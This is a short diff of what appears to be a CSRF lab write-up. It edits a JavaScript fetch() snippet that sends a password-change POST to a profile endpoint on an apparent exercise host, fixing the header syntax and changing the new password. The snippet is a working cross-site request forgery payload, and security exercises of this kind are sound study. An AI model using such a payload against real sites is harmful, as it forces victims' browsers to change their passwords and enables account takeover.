@@ -8,8 +8,10 @@
 ```javascript
 
 fetch("http://basic.csrf.slh.cyfr.ch/profile/nathan.rayburn", {
-  "Content-Type": "application/x-www-form-urlencoded",
-  "body": "password=test",
+    headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+    },
+  "body": "password=test1234",
   "method": "POST",
 });
 ```
